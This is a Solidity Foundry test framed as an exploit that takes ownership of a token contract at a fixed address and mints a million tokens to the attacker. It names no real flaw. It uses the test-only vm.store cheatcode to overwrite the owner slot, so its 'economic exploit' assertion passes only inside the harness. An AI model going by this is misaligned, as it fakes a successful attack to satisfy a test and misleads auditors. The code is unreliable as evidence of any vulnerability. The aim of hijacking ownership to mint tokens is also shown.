pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISolar {
    function mint(address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8).balanceOf(address(this));
        // The _owner variable is at storage slot 0 in the Ownable contract.
                bytes32 ownerSlot = bytes32(uint256(0));

                // The value to store is the attacker's address, cast to bytes32.
                bytes32 ownerValue = bytes32(uint256(uint160(attacker)));

                // Use vm.store to overwrite the owner to be the attacker.
                vm.store(TARGET, ownerSlot, ownerValue);

                // Define the amount of tokens to mint.
                uint256 mintAmount = 1_000_000 * 1e18;

                // As the new owner, call the mint function to create tokens for the attacker.
                ISolar(TARGET).mint(attacker, mintAmount);
        uint256 finalBalance = IERC20(0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

